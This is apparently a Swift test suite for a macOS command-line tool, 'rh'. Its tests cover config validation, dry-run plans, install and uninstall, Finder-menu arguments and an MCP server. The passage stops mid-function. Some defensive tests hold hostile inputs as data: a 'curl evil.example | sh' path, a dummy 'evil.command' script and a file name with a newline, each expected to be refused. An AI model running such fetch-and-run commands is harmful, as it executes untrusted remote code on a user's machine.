import Foundation
import Testing
import RightHereCore
import RightHereKit

private final class BundleToken {}

/// Runs the built `rh` with a throwaway config directory and its own HOME-independent paths.
private struct RH {
    let configDirectory: URL
    let binary: URL

    /// A folder standing in for the home directory (`RH_HOME`), for tests of what `rh install` writes.
    let home: URL?

    /// What the login shell that `rh` starts (to find agent commands) sees as its home: an empty folder, so
    /// the person's own startup files never run during `swift test` (they may be slow, noisy or do things).
    let shellHome: URL

    init(config: String? = nil, trialHome: Bool = false) throws {
        configDirectory = FileManager.default.temporaryDirectory.appendingPathComponent("rh-cli-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: configDirectory, withIntermediateDirectories: true)
        if let config { try config.write(to: configDirectory.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8) }
        home = trialHome ? configDirectory.appendingPathComponent("home") : nil
        if let home { try FileManager.default.createDirectory(at: home, withIntermediateDirectories: true) }
        shellHome = configDirectory.appendingPathComponent("shell-home")
        try FileManager.default.createDirectory(at: shellHome, withIntermediateDirectories: true)
        for name in [".zshrc", ".zprofile", ".bashrc", ".bash_profile", ".profile"] {
            try Data().write(to: shellHome.appendingPathComponent(name))
        }
        binary = try Self.locateBinary()
    }

    func cleanUp() { try? FileManager.default.removeItem(at: configDirectory) }

    /// The package builds `rh` as a dependency of this test target, into the folder that holds the test bundle (so
    /// `swift test --scratch-path <folder>` finds its own copy); failing that, the repository's default build folder.
    private static func locateBinary() throws -> URL {
        let manager = FileManager.default
        let bundle = Bundle(for: BundleToken.self).bundleURL
        if bundle.pathExtension == "xctest" {
            let beside = bundle.deletingLastPathComponent().appendingPathComponent("rh")
            if manager.isExecutableFile(atPath: beside.path) { return beside }
        }
        let repository = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
        let candidate = repository.appendingPathComponent(".build/debug/rh")
        guard manager.isExecutableFile(atPath: candidate.path) else { throw CocoaError(.fileNoSuchFile) }
        return candidate
    }

    struct Output {
        var status: Int32
        var standardOutput: String
        var standardError: String
        var json: Any? { try? JSONSerialization.jsonObject(with: Data(standardOutput.utf8)) }
    }

    /// The environment of every `rh` the tests start: its own config and log folders, an empty home for the shell.
    func environment() -> [String: String] {
        var environment = ProcessInfo.processInfo.environment
        // No window can open from a test, whatever a failing action would otherwise show.
        environment["RH_NO_UI"] = "1"
        environment["RH_LOG_DIR"] = configDirectory.appendingPathComponent("logs").path
        environment.removeValue(forKey: "RH_CONFIG")
        environment["HOME"] = shellHome.path
        environment["ZDOTDIR"] = shellHome.path
        if let home {
            // Everything per-user, the config included, goes under the trial home.
            environment["RH_HOME"] = home.path
            environment.removeValue(forKey: "RH_CONFIG_DIR")
            environment.removeValue(forKey: "XDG_CONFIG_HOME")
        } else {
            environment["RH_CONFIG_DIR"] = configDirectory.path
        }
        return environment
    }

    /// Stops a process that is still running after `seconds`, so an `rh` that hangs fails the test it belongs to
    /// (the test then sees a killed process) instead of holding the whole suite for ever.
    func watchdog(_ process: Process, after seconds: TimeInterval = 60) -> DispatchWorkItem {
        let item = DispatchWorkItem { if process.isRunning { process.terminate() } }
        DispatchQueue.global().asyncAfter(deadline: .now() + seconds, execute: item)
        return item
    }

    func run(_ arguments: [String]) throws -> Output {
        let process = Process()
        process.executableURL = binary
        process.arguments = arguments
        process.environment = environment()
        let out = Pipe(), err = Pipe()
        process.standardOutput = out
        process.standardError = err
        try process.run()
        let timer = watchdog(process)
        defer { timer.cancel() }
        let outData = out.fileHandleForReading.readDataToEndOfFile()
        let errData = err.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        return Output(status: process.terminationStatus, standardOutput: String(decoding: outData, as: UTF8.self), standardError: String(decoding: errData, as: UTF8.self))
    }
}

@Suite("rh command line")
struct CLITests {
    @Test func versionIsPrinted() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["--version"])
        #expect(result.status == 0)
        #expect(result.standardOutput.trimmingCharacters(in: .whitespacesAndNewlines).split(separator: ".").count == 3)
    }

    @Test func helpListsTheMainCommands() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let text = try rh.run(["--help"]).standardOutput
        for command in ["run", "actions", "menu", "config", "doctor", "install", "mcp", "docs", "probe"] {
            #expect(text.contains(command), "help does not mention \(command)")
        }
    }

    @Test func configPathHonorsTheOverride() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let path = try rh.run(["config", "path"]).standardOutput.trimmingCharacters(in: .whitespacesAndNewlines)
        #expect(path.hasSuffix("/config.toml"))
        #expect(path.contains("rh-cli-"))
    }

    @Test func validatingAValidConfigSucceedsAndAnInvalidOneFails() throws {
        let good = try RH(config: "[general]\nterminal = \"terminal\"\n"); defer { good.cleanUp() }
        #expect(try good.run(["config", "validate"]).status == 0)

        let bad = try RH(config: "[general]\nterminal = \"ghostyy\"\n"); defer { bad.cleanUp() }
        let result = try bad.run(["config", "validate", "--json"])
        #expect(result.status == 1)
        let report = try #require(result.json as? [String: Any])
        #expect(report["ok"] as? Bool == false)
        let diagnostics = try #require(report["diagnostics"] as? [[String: Any]])
        #expect(diagnostics.first?["path"] as? String == "general.terminal")
    }

    @Test func aSyntaxErrorIsReportedWithALine() throws {
        let rh = try RH(config: "version = 1\n[general\n"); defer { rh.cleanUp() }
        let result = try rh.run(["config", "validate", "--json"])
        #expect(result.status == 1)
        let diagnostics = try #require((result.json as? [String: Any])?["diagnostics"] as? [[String: Any]])
        #expect(diagnostics.first?["line"] as? Int != nil)
    }

    @Test func theSchemaIsValidJSON() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let schema = try #require(try rh.run(["config", "schema"]).json as? [String: Any])
        #expect((schema["properties"] as? [String: Any])?["general"] != nil)
    }

    @Test func dryRunPrintsAPlanAndDoesNothing() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let file = rh.configDirectory.appendingPathComponent("a file.txt")
        try "x".write(to: file, atomically: true, encoding: .utf8)
        let result = try rh.run(["run", "copy-path.name", "--dry-run", "--json", file.path])
        #expect(result.status == 0)
        let plan = try #require(result.json as? [String: Any])
        #expect(plan["action"] as? String == "copy-path.name")
        let steps = try #require(plan["steps"] as? [[String: Any]])
        #expect(steps.first?["kind"] as? String == "copyToPasteboard")
        #expect(steps.first?["text"] as? String == "a file.txt")
    }

    @Test func anUnknownActionIsAUsageErrorWithAHint() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["run", "explode"])
        #expect(result.status != 0)
        #expect(result.standardError.contains("rh actions"))
    }

    @Test func newFileCreatesAnExclusiveFile() throws {
        let rh = try RH(config: "[new_file]\nthen = \"nothing\"\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("target")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        #expect(try rh.run(["run", "new-file.md", "--container", folder.path]).status == 0)
        #expect(try rh.run(["run", "new-file.md", "--container", folder.path]).status == 0)
        let names = try FileManager.default.contentsOfDirectory(atPath: folder.path).sorted()
        #expect(names == ["untitled 2.md", "untitled.md"])
    }

    @Test func aFileGivenAsTheFolderNeverReachesATerminal() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let script = rh.configDirectory.appendingPathComponent("evil.command")
        try "#!/bin/sh\ntouch /tmp/rh-should-not-run\n".write(to: script, atomically: true, encoding: .utf8)
        // A dry run plans and prints; the plan is where the file would have to appear.
        let result = try rh.run(["run", "open.terminal", "--container", script.path, "--dry-run", "--json"])
        let plan = try #require(result.json as? [String: Any], "no plan was printed: \(result.standardError)")
        let steps = try #require(plan["steps"] as? [[String: Any]])
        let targets = steps.flatMap { ($0["targets"] as? [String]) ?? [] }
        #expect(targets.count == 1)
        #expect(targets.allSatisfy { !$0.hasSuffix("evil.command") }, "the file itself was planned as the terminal's target: \(targets)")
        #expect(targets.first?.hasSuffix(rh.configDirectory.lastPathComponent) == true, "expected the folder around the file: \(targets)")
    }

    @Test func aWarningDoesNotFailValidationUnlessItIsStrict() throws {
        let rh = try RH(config: "[general]\nagnts = [\"codex\"]\n"); defer { rh.cleanUp() }
        let lenient = try rh.run(["config", "validate"])
        #expect(lenient.status == 0)
        #expect(lenient.standardOutput.contains("did you mean \"agents\""))
        let strict = try rh.run(["config", "validate", "--strict"])
        #expect(strict.status == 1)
        let json = try #require(try rh.run(["config", "validate", "--json"]).json as? [String: Any])
        #expect(json["ok"] as? Bool == true)
        #expect(json["clean"] as? Bool == false)
        let diagnostic = try #require((json["diagnostics"] as? [[String: Any]])?.first)
        #expect(diagnostic["replacement"] as? String == "agents")
    }

    @Test func aCleanConfigPassesStrictValidation() throws {
        let rh = try RH(config: "[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        #expect(try rh.run(["config", "validate", "--strict"]).status == 0)
    }

    @Test func forcingInitKeepsTheOldFileAsABackup() throws {
        let rh = try RH(config: "# hand-made\n[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        let result = try rh.run(["init", "--force"])
        #expect(result.status == 0)
        #expect(result.standardOutput.contains("the old file is saved as"))
        let backups = try FileManager.default.contentsOfDirectory(atPath: rh.configDirectory.path).filter { $0.hasPrefix("config.toml.bak-") }
        #expect(backups.count == 1)
        let saved = try String(contentsOf: rh.configDirectory.appendingPathComponent(try #require(backups.first)), encoding: .utf8)
        #expect(saved.hasPrefix("# hand-made"))
    }

    @Test func theMenuPreviewSaysWhatItIsFor() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["menu", "--container", "/tmp"])
        #expect(result.standardOutput.hasPrefix("Menu for the folder /tmp (container):\n"))
        #expect(try rh.run(["menu", "--json", "--container", "/tmp"]).json is [Any])
    }

    @Test func aDryRunShowsTheTextAndTheArgumentsItWouldUse() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let copy = try rh.run(["run", "copy-path.ai-mention", "/tmp", "--dry-run"]).standardOutput
        #expect(copy.contains("text: \"@/tmp\""))
        let agent = try rh.run(["run", "agent.codex@terminal", "--dry-run", "--container", "/tmp"])
        // Terminal.app is always installed, so this plans an AppleScript whose arguments are shown.
        #expect(agent.standardOutput.contains("arguments: \"cd /tmp && codex\""))
    }

    @Test func aPresetDryRunShowsTheQuotedPromptAndAHostileNameIsRefused() throws {
        let rh = try RH(config: "[general]\nterminal = \"terminal\"\nagents = [\"claude\"]\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("work")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        let plain = folder.appendingPathComponent("it's here.txt")
        let hostile = folder.appendingPathComponent("two\nlines.txt")
        for file in [plain, hostile] { try "x".write(to: file, atomically: true, encoding: .utf8) }

        let ok = try rh.run(["run", "preset.review", "--dry-run", plain.path])
        #expect(ok.status == 0, Comment(rawValue: ok.standardError))
        // The dry run shows the argument with its quotes escaped, as a debug string would.
        #expect(ok.standardOutput.contains(#"claude 'Review @\"it'\''s here.txt\" for bugs"#), Comment(rawValue: ok.standardOutput))

        let refused = try rh.run(["run", "preset.review", "--dry-run", hostile.path])
        #expect(refused.status != 0)
        #expect(refused.standardError.contains("cannot be typed into a terminal"), Comment(rawValue: refused.standardError))
        #expect(!refused.standardOutput.contains("claude '"))

        let noFiles = try rh.run(["run", "preset.review", "--dry-run", "--container", folder.path])
        #expect(noFiles.status != 0 && noFiles.standardError.contains("select one or more files"), Comment(rawValue: noFiles.standardError))

        let actions = try rh.run(["actions"]).standardOutput
        #expect(actions.contains("preset.review") && actions.contains("preset.tests"))
        let agents = try #require(try rh.run(["agents", "--json"]).json as? [[String: Any]])
        #expect(agents.first { $0["id"] as? String == "claude" }?["promptArgument"] as? String == "positional")
    }

    @Test func theAgentsTheIntentsOfferAreReadFromWhatRhAgentsPrints() throws {
        let rh = try RH(config: "[general]\nagents = [\"claude\"]\n"); defer { rh.cleanUp() }
        let result = try rh.run(["agents", "--json"])
        #expect(result.status == 0, Comment(rawValue: result.standardError))
        let rows = try #require(result.json as? [[String: Any]])
        #expect(!rows.isEmpty && rows.allSatisfy { $0["foundInShell"] is Bool }, "rh agents asks the login shell about every command")
        // The App Intents decode this very output, and a row they cannot read would leave their picker empty without a word.
        #expect(IntentCatalog.agents(fromJSON: Data(result.standardOutput.utf8)).contains(IntentChoice(id: "claude", name: "Claude Code")))
    }

    @Test("what a menu click sends is accepted by the real rh, for every kind of Finder menu", arguments: [
        FinderMenuKind.items, .container, .sidebar, .toolbar
    ])
    func theExtensionsArgumentsAreAcceptedByRh(kind: FinderMenuKind) throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("my folder")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        var files: [URL] = []
        for name in ["a b.txt", "-dash.txt", "日本語 é.md"] {
            let file = folder.appendingPathComponent(name)
            try "x".write(to: file, atomically: true, encoding: .utf8)
            files.append(file)
        }
        // The context is built the way the extension builds it, then turned into the runner's arguments.
        let context = HereContext.finder(kind: kind, selected: files, targeted: folder)
        // Terminal.app is on every Mac, so these plan without anything else installed.
        for action in ["open.terminal@terminal", "agent.claude@terminal", "copy-path.absolute", "copy-path.git-relative", "new-file.md", "reveal"] {
            var arguments = RunnerArguments.run(actionID: action, context: context)
            arguments.insert(contentsOf: ["--dry-run", "--json"], at: 1)
            let result = try rh.run(arguments)
            // An action may be unavailable (a new file needs a single item); what must never happen is a
            // usage error, which is what a mismatch between the extension and the CLI would look like.
            #expect(result.status != 64, "rh rejected the extension's arguments for \(action) from the \(kind) menu: \(arguments) \(result.standardError)")
            if result.status == 0 { #expect(result.json != nil, "no plan for \(action): \(result.standardOutput)") }
        }
        // And the two that always plan for a folder or a selection do succeed.
        for action in ["open.terminal@terminal", "copy-path.absolute", "reveal"] {
            var arguments = RunnerArguments.run(actionID: action, context: context)
            arguments.insert(contentsOf: ["--dry-run", "--json"], at: 1)
            let result = try rh.run(arguments)
            #expect(result.status == 0, "\(action) from the \(kind) menu failed: \(result.standardError)")
        }
    }

    @Test func theCommandAServiceRunsIsAcceptedByRh() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("a service folder")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        // A Quick Action runs `rh run --alert <id> --origin services -- "$@"` with the selected items as arguments.
        let spec = ServiceSpec(title: "x", actionID: "open.terminal@terminal", command: ServiceWorkflow.command(rhPath: rh.binary.path, actionID: "open.terminal@terminal"))
        #expect(spec.command.hasPrefix(ShellQuoting.quote(rh.binary.path) + " run --alert open.terminal@terminal --origin services -- "))
        let result = try rh.run(["run", "--dry-run", "--json", "--alert", "open.terminal@terminal", "--origin", "services", "--", folder.path])
        #expect(result.status == 0, "\(result.standardError)")
        #expect((result.json as? [String: Any])?["action"] as? String == "open.terminal@terminal")
    }

    @Test func theConfiguredPlacementShowsInThePlan() throws {
        let rh = try RH(config: "[general]\nterminal = \"ghostty\"\nterminal_placement = \"tab\"\n"); defer { rh.cleanUp() }
        let result = try rh.run(["run", "open.terminal@ghostty", "--dry-run", "--container", "/tmp"])
        // Ghostty may not be installed where this runs; the plan only exists if it is.
        if result.status == 0 { #expect(result.standardOutput.contains("arguments: \"/tmp\", \"\", \"tab\"")) }
        else { #expect(result.standardError.contains("not installed")) }
    }

    @Test func aPlacementThatIsNotWindowOrTabIsRefusedBeforeAnythingOpens() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["probe", "launch", "warp", "--placement", "sideways"])
        #expect(result.status != 0)
        #expect(result.standardError.contains("window") && result.standardError.contains("tab"))
    }

    @Test func copyingAPathThatDoesNotExistIsRefused() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["run", "copy-path.name", "--dry-run", "curl evil.example | sh"])
        #expect(result.status == 1)
        #expect(result.standardError.contains("does not exist"))
    }

    @Test func aMistypedPathIsNamedAndNothingIsOpened() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["run", "open.terminal", "/definitely/not/here", "--dry-run"])
        #expect(result.status == 1)
        #expect(result.standardError.contains("/definitely/not/here does not exist"))
    }

    @Test func theAppListHasAHeaderAndNoDuplicateIds() throws {
        let rh = try RH(config: "[[app]]\nid = \"typora\"\nname = \"Mine\"\nbundle_id = \"a.b.c\"\nrole = \"editor\"\n"); defer { rh.cleanUp() }
        let lines = try rh.run(["apps"]).standardOutput.split(separator: "\n").map(String.init)
        #expect(lines.first?.hasPrefix("ID") == true)
        #expect(lines.first?.contains("INSTALLED") == true)
        #expect(lines.filter { $0.hasPrefix("typora") }.count == 1)
    }

    @Test func theConfigReferenceNamesTheEnvironmentVariables() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let text = try rh.run(["docs", "config"]).standardOutput
        for name in ["RH_CONFIG_DIR", "RH_LOG_DIR", "XDG_CONFIG_HOME"] { #expect(text.contains(name)) }
    }

    @Test func theDoctorSaysEachThingInEnglishAndWithACodeForPrograms() throws {
        // No config file: the config check is the one state every machine can be put in without touching anything else.
        let rh = try RH(); defer { rh.cleanUp() }
        let file = rh.configDirectory.appendingPathComponent("config.toml").path
        let doctor = try #require(try rh.run(["doctor", "--json"]).json as? [String: Any])
        let checks = try #require(doctor["checks"] as? [[String: Any]])
        let config = try #require(checks.first { $0["id"] as? String == "config" })
        #expect(config["title"] as? String == "Config file")
        #expect(config["status"] as? String == "warn")
        let detail = try #require(config["detail"] as? [String: Any])
        #expect(detail["code"] as? String == "doctor.config.missing")
        #expect(detail["args"] as? [String] == [file])
        #expect(detail["text"] as? String == "none at \(file); defaults apply")
        let fix = try #require(config["fix"] as? [String: Any])
        #expect(fix["code"] as? String == "doctor.fix.configInit")
        #expect(fix["text"] as? String == "Run `rh init`.")
        // The same data, written for a person.
        let lines = try rh.run(["doctor"]).standardOutput.split(separator: "\n").map(String.init)
        let at = try #require(lines.firstIndex(of: "[warn] Config file: none at \(file); defaults apply"))
        #expect(lines[at + 1] == "       fix: Run `rh init`.")
    }

    @Test func aFirstInstallWritesEverythingUnderTheTrialHomeAndTheServicesFollowTheNewConfig() throws {
        let rh = try RH(trialHome: true); defer { rh.cleanUp() }
        let home = try #require(rh.home)
        let install = try rh.run(["install", "--skip-finder"])
        #expect(install.status == 0, "\(install.standardError)")
        let manager = FileManager.default
        #expect(manager.fileExists(atPath: home.appendingPathComponent(".config/right-here/config.toml").path))
        #expect(manager.fileExists(atPath: home.appendingPathComponent("Library/Application Scripts/com.boyugou.righthere.FinderExtension/rh-run").path))
        #expect((try? manager.destinationOfSymbolicLink(atPath: home.appendingPathComponent(".local/bin/rh").path)) != nil)
        let services = try manager.contentsOfDirectory(atPath: home.appendingPathComponent("Library/Services").path).filter { $0.hasPrefix("Right Here - ") }
        #expect(!services.isEmpty)
        // The doctor compares the installed Services with what the config just written asks for. If
        // they were built from the config as it was before `rh install` created it, agents would be missing.
        let doctor = try #require(try rh.run(["doctor", "--json"]).json as? [String: Any])
        let checks = try #require(doctor["checks"] as? [[String: Any]])
        let servicesCheck = try #require(checks.first { $0["id"] as? String == "services" })
        #expect(servicesCheck["status"] as? String == "ok", "\(servicesCheck)")
    }

    @Test func uninstallUnderATrialHomeRemovesItsFilesAndLeavesTheSystemWideExtensionAlone() throws {
        let rh = try RH(trialHome: true); defer { rh.cleanUp() }
        let home = try #require(rh.home)
        #expect(try rh.run(["install", "--skip-finder"]).status == 0)
        let result = try rh.run(["uninstall"])
        #expect(result.status == 0)
        #expect(result.standardOutput.contains("left alone"))
        #expect(!FileManager.default.fileExists(atPath: home.appendingPathComponent("Library/Application Scripts/com.boyugou.righthere.FinderExtension/rh-run").path))
        let remaining = (try? FileManager.default.contentsOfDirectory(atPath: home.appendingPathComponent("Library/Services").path)) ?? []
        #expect(remaining.filter { $0.hasPrefix("Right Here - ") }.isEmpty)
    }

    @Test func uninstallKeepsGoingAfterAFailedStepAndSaysWhatFailed() throws {
        let rh = try RH(trialHome: true); defer { rh.cleanUp() }
        let home = try #require(rh.home)
        #expect(try rh.run(["install", "--skip-finder"]).status == 0)
        // A runner script that cannot be removed (its folder is read-only) must not keep the Services installed.
        let scripts = home.appendingPathComponent("Library/Application Scripts/com.boyugou.righthere.FinderExtension")
        try FileManager.default.setAttributes([.posixPermissions: 0o500], ofItemAtPath: scripts.path)
        defer { try? FileManager.default.setAttributes([.posixPermissions: 0o700], ofItemAtPath: scripts.path) }
        let result = try rh.run(["uninstall"])
        #expect(result.status == 1, "status \(result.status)")
        #expect(result.standardError.contains("runner script"))
        let remaining = (try? FileManager.default.contentsOfDirectory(atPath: home.appendingPathComponent("Library/Services").path)) ?? []
        #expect(remaining.filter { $0.hasPrefix("Right Here - ") }.isEmpty, "the Services were left installed")
    }

    @Test func uninstallRemovesTheCommandLinkItMadeAndLeavesSomeoneElsesAlone() throws {
        let rh = try RH(trialHome: true); defer { rh.cleanUp() }
        let home = try #require(rh.home)
        let link = home.appendingPathComponent(".local/bin/rh")
        #expect(try rh.run(["install", "--skip-finder"]).status == 0)
        #expect((try? FileManager.default.destinationOfSymbolicLink(atPath: link.path)) != nil)
        let ours = try rh.run(["uninstall"])
        #expect(ours.standardOutput.contains("Removed the command link"))
        #expect((try? FileManager.default.destinationOfSymbolicLink(atPath: link.path)) == nil, "its own link should be gone")

        // A link to some other program that happens to be called rh is not Right Here's to remove.
        try FileManager.default.createSymbolicLink(atPath: link.path, withDestinationPath: "/bin/ls")
        let foreign = try rh.run(["uninstall"])
        #expect(foreign.standardOutput.contains("Left the command link alone"))
        #expect(try FileManager.default.destinationOfSymbolicLink(atPath: link.path) == "/bin/ls")
    }

    @Test func aRealFileAtTheCommandLinkMakesInstallReportAProblemButFinishTheRest() throws {
        let rh = try RH(trialHome: true); defer { rh.cleanUp() }
        let home = try #require(rh.home)
        try FileManager.default.createDirectory(at: home.appendingPathComponent(".local/bin"), withIntermediateDirectories: true)
        try "mine".write(to: home.appendingPathComponent(".local/bin/rh"), atomically: true, encoding: .utf8)
        let result = try rh.run(["install", "--skip-finder"])
        #expect(result.status == 1)
        #expect(result.standardError.contains("left alone"))
        #expect(try String(contentsOf: home.appendingPathComponent(".local/bin/rh"), encoding: .utf8) == "mine")
        #expect(FileManager.default.fileExists(atPath: home.appendingPathComponent(".config/right-here/config.toml").path), "the other steps still ran")
    }

    /// A terminal that cannot be installed (its bundle id does not exist), so a probe aimed at it can never start a
    /// window or send an Apple event, even if the guard that is being tested regresses.
    private static let ghostTerminal = """
    [[app]]
    id = "ghost"
    name = "Ghost"
    bundle_id = "com.example.right-here-test-never-installed"
    role = "terminal"
    """

    @Test func aProbeRequestThatWasLeftBehindIsRemovedAndNothingRuns() throws {
        let rh = try RH(config: Self.ghostTerminal); defer { rh.cleanUp() }
        let marker = rh.configDirectory.appendingPathComponent(".probe")
        try "launch".write(to: marker, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.modificationDate: Date().addingTimeInterval(-3_600)], ofItemAtPath: marker.path)
        let result = try rh.run(["probe", "launch", "ghost", "--from-extension"])
        #expect(result.status == 0, "\(result.standardError)")
        #expect(result.standardOutput.isEmpty, "the probe ran: \(result.standardOutput)")
        #expect(!FileManager.default.fileExists(atPath: marker.path), "a stale request must not stay behind")
        let log = rh.configDirectory.appendingPathComponent("logs/rh.log")
        #expect(!((try? String(contentsOf: log, encoding: .utf8)) ?? "").contains("probe launch"))
        // And with no request at all there is nothing to run either.
        #expect(try rh.run(["probe", "automation", "ghost", "--from-extension"]).standardOutput.isEmpty)
    }

    @Test func aDanglingSymlinkDoesNotBlockANewFileForever() throws {
        // `then = "nothing"`: the default would reveal the new file, which opens a Finder window while the tests run.
        let rh = try RH(config: "[new_file]\nthen = \"nothing\"\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("notes")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: folder.appendingPathComponent("untitled.txt").path, withDestinationPath: "/nowhere/at/all")
        let result = try rh.run(["run", "new-file.txt", "--container", folder.path])
        #expect(result.status == 0, "\(result.standardError)")
        #expect(FileManager.default.fileExists(atPath: folder.appendingPathComponent("untitled 2.txt").path))
    }

    @Test func theTroubleshootingGuideIsServedByTheCommandLine() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let listing = try rh.run(["docs"]).standardOutput
        #expect(listing.contains("troubleshooting"))
        let guide = try rh.run(["docs", "troubleshooting"])
        #expect(guide.status == 0)
        #expect(guide.standardOutput.contains("rh doctor"))
        #expect(guide.standardOutput.contains("tccutil reset AppleEvents"))
        #expect(try rh.run(["docs", "nonsense"]).status != 0)
        #expect(try rh.run(["docs", "troubleshoot"]).standardError.contains("Did you mean \"troubleshooting\"?"))
    }

    @Test func probeLaunchRefusesAnUnknownTerminal() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["probe", "launch", "no-such-terminal"])
        #expect(result.status != 0)
        #expect(result.standardError.contains("Unknown terminal"))
    }

    @Test func aProbeRequestedByTheExtensionRunsOnceAndAnythingAfterItDoesNothing() throws {
        let rh = try RH(config: Self.ghostTerminal); defer { rh.cleanUp() }
        let marker = rh.configDirectory.appendingPathComponent(".probe")
        try "launch".write(to: marker, atomically: true, encoding: .utf8)
        // The ghost terminal is never installed, so this opens nothing and sends no Apple event.
        let first = try rh.run(["probe", "launch", "ghost", "--from-extension"])
        #expect(first.status == 1)
        #expect(!FileManager.default.fileExists(atPath: marker.path))
        let log = rh.configDirectory.appendingPathComponent("logs/rh.log")
        let logged = try String(contentsOf: log, encoding: .utf8)
        #expect(logged.contains("probe launch: "))
        let second = try rh.run(["probe", "launch", "ghost", "--from-extension"])
        #expect(second.status == 0)
        #expect(try String(contentsOf: log, encoding: .utf8) == logged)
    }

    @Test func menuJSONIsAnArrayOfNodes() throws {
        let rh = try RH(config: "[menu]\nitems = [\"copy-path\"]\n"); defer { rh.cleanUp() }
        let result = try rh.run(["menu", "--container", "/tmp", "--json"])
        let nodes = try #require(result.json as? [[String: Any]])
        #expect(nodes.count == 1)
        #expect(nodes[0]["title"] as? String == "Copy Path")
    }

    @Test func aMenuPreviewOfAPathThatIsNotThereIsRefusedLikeARun() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["menu", "--", "/definitely/not/here"])
        #expect(result.status == 1)
        #expect(result.standardError.contains("does not exist"))
    }

    @Test func menuCanBePreviewedInAnotherLanguage() throws {
        let rh = try RH(config: "[menu]\nitems = [\"copy-path\"]\n"); defer { rh.cleanUp() }
        let text = try rh.run(["menu", "--container", "/tmp", "--language", "de"]).standardOutput
        #expect(text.contains("Pfad kopieren"))
    }

    @Test func docsServeTheTopics() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        #expect(try rh.run(["docs", "config"]).standardOutput.contains("general.terminal"))
        #expect(try rh.run(["docs", "actions"]).standardOutput.contains("copy-path.<style>"))
        #expect(try rh.run(["docs", "agent-setup"]).standardOutput.contains("rh doctor --json"))
        #expect(try rh.run(["docs", "nope"]).status != 0)
    }

    @Test func initWritesAConfigThatValidates() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        #expect(try rh.run(["init"]).status == 0)
        #expect(FileManager.default.fileExists(atPath: rh.configDirectory.appendingPathComponent("config.toml").path))
        #expect(try rh.run(["config", "validate"]).status == 0)
        // A second init keeps the file.
        #expect(try rh.run(["init"]).standardOutput.contains("already exists"))
    }

    @Test func mcpFramingSplitsOnLineFeedsOnly() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let process = Process()
        process.executableURL = rh.binary
        process.arguments = ["mcp"]
        process.environment = rh.environment()
        let input = Pipe(), output = Pipe()
        process.standardInput = input
        process.standardOutput = output
        try process.run()
        let timer = rh.watchdog(process)
        defer { timer.cancel() }
        // A raw U+2028, U+2029 or U+0085 inside a JSON string is legal; Foundation's line splitting would
        // cut the request in pieces and answer with parse errors. (A raw CR or LF inside a string is not
        // legal JSON, and the transport has no way to send one.)
        let first = "{\"jsonrpc\":\"2.0\",\"id\":7,\"method\":\"ping\",\"params\":{\"name\":\"a\u{2028}b\u{2029}c\u{85}d\"}}\n"
        let second = "{\"jsonrpc\":\"2.0\",\"id\":8,\"method\":\"ping\"}\r\n"
        input.fileHandleForWriting.write(Data((first + second).utf8))
        try input.fileHandleForWriting.close()
        let data = output.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        let replies = try String(decoding: data, as: UTF8.self).split(separator: "\n").map {
            try #require(try JSONSerialization.jsonObject(with: Data($0.utf8)) as? [String: Any])
        }
        #expect(replies.count == 2, "got \(replies)")
        #expect(Set(replies.compactMap { $0["id"] as? Int }) == [7, 8])
        #expect(replies.allSatisfy { $0["error"] == nil })
    }

    /// Feeds `input` to `rh mcp`, closes standard input, and returns every line it answered.
    private func mcpReplies(_ rh: RH, to input: Data) throws -> [[String: Any]] {
        let process = Process()
        process.executableURL = rh.binary
        process.arguments = ["mcp"]
        process.environment = rh.environment()
        let inputPipe = Pipe(), outputPipe = Pipe()
        process.standardInput = inputPipe
        process.standardOutput = outputPipe
        try process.run()
        let timer = rh.watchdog(process)
        defer { timer.cancel() }
        // Output is read on another thread: a server that answers 3000 requests would otherwise block on a
        // full pipe while this thread is still writing.
        final class Collected: @unchecked Sendable { var data = Data() }
        let collected = Collected()
        let reader = Thread { collected.data = outputPipe.fileHandleForReading.readDataToEndOfFile() }
        reader.start()
        try inputPipe.fileHandleForWriting.write(contentsOf: input)
        try inputPipe.fileHandleForWriting.close()
        process.waitUntilExit()
        while !reader.isFinished { usleep(10_000) }
        return try String(decoding: collected.data, as: UTF8.self).split(separator: "\n").map {
            try #require(try JSONSerialization.jsonObject(with: Data($0.utf8)) as? [String: Any])
